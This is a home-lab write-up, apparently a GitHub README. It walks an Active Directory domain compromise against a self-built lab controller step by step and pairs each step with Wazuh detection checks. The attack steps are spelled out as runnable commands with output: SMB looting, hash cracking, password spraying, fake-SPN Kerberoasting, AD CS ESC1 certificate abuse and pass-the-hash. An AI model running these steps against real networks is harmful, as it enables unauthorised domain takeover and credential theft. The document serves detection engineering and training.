# Active Directory Attack & Detection Home Lab

```
     _
    | |
 ---+-+---   xyz.com domain compromise chain
    |_|      home lab created by sawsage
   -------
```

<div align="center">

**Target:** `192.168.29.244` (DC01, `xyz.com`) — Windows Server AD DC
**Attacker:** Kali Linux &nbsp;|&nbsp; **Detection Stack:** Wazuh (SIEM)
**Goal:** Full domain compromise, end-to-end, with every step correlated against SIEM alerts

</div>

---

## Table of Contents

1. [Lab Overview](#-Lab-Overview)
2. [Setup](#-Setup)
3. [Attack Chain](#-attack-chain)
   - [1. Reconnaissance](#1-reconnaissance)
   - [2. Anonymous SMB Access & Loot](#2-anonymous-smb-access--loot)
   - [3. Cracking & Credential Spray](#3-cracking--credential-spray)
   - [4. BloodHound Enumeration & the Recycle Bin Rabbit Hole](#4-bloodhound-enumeration--the-recycle-bin-rabbit-hole)
   - [5. Fake-SPN Kerberoast](#5-fake-spn-kerberoast)
   - [6. AD CS Abuse — ESC1](#6-ad-cs-abuse--esc1)
   - [7. Pass-the-Hash → Domain Admin](#7-pass-the-hash--domain-admin)
4. [Detection Chain Summary](#-detection-chain-summary)
5. [Lessons Learned](#-lessons-learned)

---

## Lab Overview

This lab simulates a realistic internal AD compromise from initial recon to Domain Admin, while validating that every attacker action leaves a corresponding trail in **Wazuh**. The idea was to pair offense (attack execution) with defense (log/alert verification) at every single step — so it doubles as both a pentest and a SOC detection exercise.

**Components:**

| Component | Role | OS |
|---|---|---|
| Attacker machine | Offensive tooling (Kali) | Kali Linux |
| DC01 | Domain Controller, `xyz.com` | Windows Server |
| Wazuh Server | SIEM / log aggregation | Ubuntu |
| `Control` lab | Custom vulnerable AD environment | Self-built |

I built the vulnerable AD environment myself — it's called **Control**, and it's public if you want to spin up the same scenario:
[Labs_To_3xploit / Control](https://github.com/Aditya-k-Jangid/Labs_To_3xploit/tree/main/Control) 

---

## Setup

Before touching the attack chain, it's worth reading these two Wazuh blog posts — they explain *how* Wazuh detects AD attacks under the hood, which makes the rest of this setup click much faster:

- [Detecting AD attacks with Wazuh — Part 1](https://wazuh.com/blog/how-to-detect-active-directory-attacks-with-wazuh-part-1/)
- [Detecting AD attacks with Wazuh — Part 2](https://wazuh.com/blog/how-to-detect-active-directory-attacks-with-wazuh-part-2/)

**Build order:**

1. **Attacker machine (Kali)** — install ISO, bring up in VMware, place on the same network as the DC, install offensive tooling.
   Full guide: [Control README](https://github.com/Aditya-k-Jangid/Labs_To_3xploit/blob/main/Control/README.md)
2. **Wazuh server (Ubuntu)** — install and configure the Wazuh manager/indexer/dashboard.
   Full guide: [Wazha_setup.md](https://github.com/Aditya-k-Jangid/Home_lab/blob/main/Wazha_setup.md)
3. **Detection rules** — load a rule set tuned for AD attack telemetry:
   [local_rules.xml](https://github.com/Aditya-k-Jangid/Home_lab/blob/main/local_rules.xml), or reference [socfortress/Wazuh-Rules](https://github.com/socfortress/Wazuh-Rules) to build your own.
4. **Sanity checks** — ping test between all machines, confirm Wazuh agents check in, Make sure all the Defense Machinism which may cause issues are Turned off , confirm DC01 is fully promoted and reachable.

Once all of that is green, the environment is ready for the attack chain below.

---

## Attack Chain

### 1. Reconnaissance

Standard service/version scan against the DC:

```bash
nmap -sS -sV -T4 192.168.29.244
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-30 10:29:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: xyz.com, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: xyz.com, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: xyz.com, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: xyz.com, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

DNS, Kerberos, LDAP/LDAPS, SMB, and WinRM (5985) all exposed together is a textbook DC fingerprint. Domain confirmed as `xyz.com`.

**Detection check — Wazuh → Threat Hunting:**

<img width="2530" height="1257" alt="Wazuh threat hunting overview" src="https://github.com/user-attachments/assets/1afcd62d-023f-4eba-8011-be2dea813e1e" />

Filtered under **Event Tab** using `rule.id:100021`:

<img width="2533" height="1485" alt="Wazuh nmap scan detection" src="https://github.com/user-attachments/assets/8167fe6b-35f5-4cff-9e35-1ffd5db22e5e" />

**The scan was captured.**

---

### 2. Anonymous SMB Access & Loot

Checked for open/null-session shares:

```bash
nxc smb 192.168.29.244 -u '' -p '' --shares
```

The `Del_me` share allowed anonymous **READ** access. Pulled a file down:

```bash
smbclient //192.168.29.244/Del_me -U '' -N -c 'get Info.sqlite3'
getting file \Info.sqlite3 of size 16384 as Info.sqlite3 (1230.8 KiloBytes/sec) (average 1230.8 KiloBytes/sec)
```

Inside the SQLite DB were two tables of interest:

- `Del_me` → 3 raw MD5 hashes
- `Employe_Info` → name / dept / DOB / employee-ID rows for 4 staff members (John Willium, jack, berserker, Emilia rosegold)

**Detection check — Event Viewer → Windows Logs → Security, filtered on `Event ID: 4634`:**

<img width="404" height="416" alt="Event ID 4634 filter" src="https://github.com/user-attachments/assets/f1bdc10c-f54d-46ce-8236-a6e3349db798" />

<img width="1041" height="636" alt="4634 logon events captured" src="https://github.com/user-attachments/assets/c7fc2851-9444-4adf-ae41-57cc05c80fa7" />

Clicking into a specific event surfaces the source IP (`192.168.29.245`) and other session details — confirming the anonymous SMB session was logged.

---

### 3. Cracking & Credential Spray

Built a targeted wordlist from the leaked employee fields, then mutated it with John the Ripper rules before running it through hashcat:

```bash
john --wordlist=text.txt --rules=all --stdout > mutated_wordlist.txt
hashcat -m 0 hash.txt mutated_wordlist.txt
```

**Result:** 1 of 3 hashes cracked → password `j0hn`.

```
[hashcat] status .... exhausted
[hashcat] 1/3 hashes  : cracked
[hashcat] recovered   : j0hn
```

Sprayed the cracked password against a user list built from the SQLite names:

```bash
nxc ldap xyz.com -u user.txt -p 'j0hn'
```

**Hit:** `xyz.com\John Willium : j0hn`

---

### 4. BloodHound Enumeration & the Recycle Bin Rabbit Hole

Collected AD relationship data:

```bash
bloodyAD --host 192.168.29.244 -d xyz.com -u 'John willium' -p 'j0hn' get bloodhound
```

John Willium showed `GenericWrite` over a user — initially looked promising, but turned out to be a dead end (rabbit hole):

<img width="1531" height="372" alt="BloodHound GenericWrite path" src="https://github.com/user-attachments/assets/4ffd80ca-6b7e-4db5-a7a2-2376fad63c52" />

The actual path: a **deleted user, `Orange`**, sitting in the Recycle Bin. John held `WRITE` / `CREATE_CHILD` rights on `CN=Deleted Objects`:

```bash
bloodyAD --host 192.168.29.244 -d xyz.com -u 'John willium' -p 'j0hn' get writable
```

**Restore the deleted object:**

```bash
bloodyAD -u 'John Willium' -p 'j0hn' -d xyz.com --host DC01.xyz.com --dc-ip 192.168.29.244 set restore Orange
[+] Orange has been restored successfully under CN=Orange,CN=Users,DC=xyz,DC=com
```

<img width="1636" height="421" alt="Orange restored" src="https://github.com/user-attachments/assets/923d17a6-acd3-43e5-9389-824b8e5d27ae" />

**Detection check — Wazuh:**

<img width="2530" height="1249" alt="Wazuh object restore alert" src="https://github.com/user-attachments/assets/b57dfbc9-fe2e-4ad0-9ab6-60b663cf6c1f" />

Drilling into the event details confirms the **target user is Orange**, the **actor is John Willium**, and the **source IP is the attacker machine** (`192.168.29.244`):

<img width="1231" height="1147" alt="Restore event details" src="https://github.com/user-attachments/assets/e0e4aa24-77b2-4b4a-86fb-d9aa20aebed7" />

Re-running BloodHound collection shows Orange is a member of `CN=Pentesters`.

---

### 5. Fake-SPN Kerberoast

Orange had no SPN by default, so one was added to make the account roastable (a targeted/fake-SPN Kerberoast trick — abusing `GenericAll` on Orange):

```bash
bloodyAD --host 192.168.29.244 -d xyz.com -u 'John willium' -p 'j0hn' \
  set object 'CN=Orange,CN=Users,DC=xyz,DC=com' servicePrincipalName -v 'fake/orange.xyz.com'

[+] CN=Orange,CN=Users,DC=xyz,DC=com's servicePrincipalName has been updated
```

Requested the ticket for offline cracking:

```bash
GetUserSPNs.py xyz.com/'John willium':'j0hn' -dc-ip 192.168.29.244 -request -outputfile orange_hash.txt

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name    MemberOf                              PasswordLastSet             LastLogon  Delegation
--------------------  ------  ------------------------------------  --------------------------  ---------  ----------
fake/orange.xyz.com   Orange  CN=Pentesters,CN=Users,DC=xyz,DC=com  2026-08-01 22:34:34.722759  <never>
```

Cracked the TGS-REP hash offline:

```bash
hashcat -m 13100 orange_hash.txt rockyou.txt
```

**Result:** `Orange : secret2!` — and Orange is a member of `RemoteManagementUsers`, meaning WinRM access to the box.

**Detection check — Wazuh:**

<img width="2536" height="1351" alt="SPN modification alert" src="https://github.com/user-attachments/assets/b0347120-2033-43aa-ac40-a9a850c8c471" />

Event details confirm the request originated from the attacker IP (`192.168.29.244`):

<img width="1236" height="1425" alt="Kerberoast request details" src="https://github.com/user-attachments/assets/0b533bd0-3908-4890-9427-cb3edcb1358e" />

---

### 6. AD CS Abuse — ESC1

With WinRM-capable creds in hand, the next move is privilege escalation. The certificate template `Workstation-Enrollment-Prod` was found vulnerable to **ESC1**: enrollees can supply an arbitrary subject/UPN and enroll for client authentication — letting a low-privileged user (Orange) request a certificate that authenticates as a high-privileged one (Administrator).

```bash
certipy-ad find -username "Orange" -p 'secret2!' -target 192.168.29.244 -stdout
```

Findings on `Workstation-Enrollment-Prod`:
- Enrollee Supplies Subject: yes
- Client Authentication: yes
- Enrollment rights → `XYZ.COM\Pentesters` (Orange is a member)

**Request a certificate impersonating Administrator:**

```bash
certipy-ad req -u 'Orange@xyz.com' -p 'secret2!' \
  -target 192.168.29.244 \
  -ca 'DC01-CA' \
  -template 'Workstation-Enrollment-Prod' \
  -upn 'administrator@xyz.com'

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 31
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@xyz.com'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Detection check — certificate request logs:**

<img width="2539" height="1272" alt="Cert request alert" src="https://github.com/user-attachments/assets/2761ebeb-cdbb-43b1-9bcd-10e8636e3e17" />

<img width="1282" height="1236" alt="Cert request details" src="https://github.com/user-attachments/assets/70378ad0-9202-43bd-b78c-a593f45536e2" />

**Certificate issued logs:**

<img width="2545" height="1315" alt="Cert issued alert" src="https://github.com/user-attachments/assets/28332218-6bef-48ff-8059-00ce60f7241c" />

<img width="1219" height="1423" alt="Cert issued details" src="https://github.com/user-attachments/assets/1d7b9df2-87f6-4230-8896-380b9717331c" />

---

### 7. Pass-the-Hash → Domain Admin

Used the forged certificate to authenticate and pull the Administrator's NT hash:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.29.244

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@xyz.com'
[*] Using principal: 'administrator@xyz.com'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@xyz.com': aad3b435b51404eeaad3b435b51404ee:0aa71e2167b6136dd8e4b17ed9fd8f91
```

**Detection check — Wazuh:**

<img width="2533" height="958" alt="TGT/hash retrieval alert" src="https://github.com/user-attachments/assets/c3323559-431b-4744-955d-31e9093463be" />

<img width="1258" height="1252" alt="TGT retrieval event details" src="https://github.com/user-attachments/assets/4271fb6b-1e8c-45b4-8990-e3ab4fa4f41b" />

**Final step — Pass-the-Hash into WinRM as Administrator:**

```bash
evil-winrm -i xyz.com -u 'Administrator' -H '0aa71e2167b6136dd8e4b17ed9fd8f91'

Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
xyz\administrator
```

<img width="1291" height="265" alt="Pass the hash success - whoami administrator" src="https://github.com/user-attachments/assets/d2bcb4a8-3ba0-4233-9e66-79aaf3402805" />

**Domain Admin achieved** — full compromise of `xyz.com`.

---

## Detection Chain Summary

| # | Attacker Action | Detection Source | Result |
|---|---|---|---|
| 1 | Nmap service scan | Wazuh — Threat Hunting (`rule.id:100021`) | Captured |
| 2 | Anonymous SMB read (`Del_me` share) | Windows Event Viewer (`Event ID 4634`) | Captured |
| 3 | Credential cracking + LDAP spray | Offline — no telemetry expected | — |
| 4 | Restore deleted user `Orange` | Wazuh — AD object restore alert | Captured, actor/target/IP confirmed |
| 5 | Fake-SPN + Kerberoast on `Orange` | Wazuh — SPN modification & TGS request alert | Captured, source IP confirmed |
| 6 | ESC1 certificate request (`administrator` UPN) | Wazuh — Cert request & cert issued alerts | Captured |
| 7 | Cert-based TGT/NT hash retrieval | Wazuh — TGT retrieval alert | Captured |
| 8 | Pass-the-Hash → WinRM as Administrator | *(gap — no explicit Wazuh alert screenshotted)* | Worth adding a PtH/WinRM auth rule |

**Full chain, condensed:**

```
Anon SMB leak → cracked hash (j0hn) → LDAP spray → John Willium creds
   → BloodHound recon → restore deleted user Orange
   → Fake SPN + Kerberoast → Orange creds (secret2!)
   → ESC1 template abuse → Administrator certificate
   → Pass-the-Hash → Domain Admin
```

---

## Lessons Learned

- **Anonymous SMB shares are still a real initial-access vector** — a single readable share leaked enough employee metadata to seed a working wordlist.
- **The Recycle Bin is a legitimate attack surface.** `WRITE`/`CREATE_CHILD` on `CN=Deleted Objects` is easy to overlook in ACL reviews but gave a full pivot path here.
- **Fake-SPN Kerberoasting** shows that "no SPN" isn't a safe assumption if the attacker already has write rights on the object — `GenericAll`/`GenericWrite` on a user is effectively "can become roastable."
- **ESC1 remains one of the highest-impact AD CS misconfigurations** — a single over-permissive template turned a low-privileged, WinRM-only user into Domain Admin in two commands.
- **Wazuh + Sysmon/Windows Security auditing caught every stage except the final PtH/WinRM login** — a good candidate for a follow-up custom rule (e.g., alerting on WinRm/NTLM auth using a hash-only credential, or correlating Kerberos TGT issuance immediately followed by a new admin session).
